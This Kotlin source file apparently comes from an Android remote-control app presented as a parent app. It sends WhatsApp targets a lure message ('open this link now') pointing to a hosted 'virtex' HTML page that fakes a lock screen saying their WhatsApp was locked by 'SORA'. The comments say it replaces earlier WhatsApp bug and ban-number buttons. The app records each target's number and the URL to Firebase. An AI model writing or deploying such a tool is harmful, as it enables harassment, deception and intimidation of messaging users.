package com.familychat.parent

import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.widget.EditText
import android.widget.Toast
import com.google.firebase.database.DatabaseReference

/**
 * Virtex LockChat sender (parent side).
 * Replaces old WA bug / ban group / ban number buttons.
 *
 * Alur:
 * 1. Parent isi nomor target (opsional) + pilih cara kirim.
 * 2. Link / file HTML virtex dikirim ke target.
 * 3. Target buka link → browser HP langsung tampil lock:
 *    "WhatsApp anda telah dikunci by SORA"
 *
 * Catatan: ini client-side HTML lock (browser). Bukan inject ke proses WhatsApp.
 * Semakin “nempel” kalau target buka di Chrome/Firefox in-app browser WA.
 */
object VirtexSender {

    // Ganti URL ini ke tempat kamu host file sora_lockchat.html (GitHub Pages / Firebase Hosting / Netlify / dll)
    // Contoh: "https://yourname.github.io/sora/sora_lockchat.html"
    const val DEFAULT_VIRTEX_URL = "https://YOUR_HOST/sora_lockchat.html"

    fun showSendDialog(ctx: Context, controlRef: DatabaseReference? = null) {
        val inputPhone = EditText(ctx).apply {
            hint = "Nomor target (628xxx) — opsional"
        }
        val inputUrl = EditText(ctx).apply {
            hint = "URL virtex (kosong = pakai default)"
            setText(DEFAULT_VIRTEX_URL)
        }

        val layout = android.widget.LinearLayout(ctx).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(48, 24, 48, 8)
            addView(inputPhone)
            addView(inputUrl)
        }

        AlertDialog.Builder(ctx)
            .setTitle("Virtex LockChat")
            .setMessage("Kirim link HTML lock ke target.\nPas dibuka → layar kunci + teks:\n\"WhatsApp anda telah dikunci by SORA\"")
            .setView(layout)
            .setPositiveButton("Kirim lewat WA") { _, _ ->
                val phone = inputPhone.text.toString().trim().replace("+", "").replace(" ", "").replace("-", "")
                val url = inputUrl.text.toString().trim().ifBlank { DEFAULT_VIRTEX_URL }
                openWhatsApp(ctx, phone, buildMessage(url))
                controlRef?.child("virtex")?.setValue(
                    mapOf(
                        "active" to true,
                        "url" to url,
                        "phone" to phone,
                        "ts" to System.currentTimeMillis()
                    )
                )
            }
            .setNeutralButton("Salin Link") { _, _ ->
                val url = inputUrl.text.toString().trim().ifBlank { DEFAULT_VIRTEX_URL }
                val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("virtex", url))
                Toast.makeText(ctx, "Link disalin", Toast.LENGTH_SHORT).show()
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun buildMessage(url: String): String {
        return """
            Halo, ada pesan penting untukmu.
            Buka link ini sekarang:
            $url
        """.trimIndent()
    }

    private fun openWhatsApp(ctx: Context, phone: String, text: String) {
        try {
            val uri = if (phone.isNotBlank()) {
                Uri.parse("https://wa.me/$phone?text=${Uri.encode(text)}")
            } else {
                Uri.parse("https://wa.me/?text=${Uri.encode(text)}")
            }
            val i = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (e: Exception) {
            Toast.makeText(ctx, "WhatsApp tidak ditemukan", Toast.LENGTH_SHORT).show()
        }
    }
}
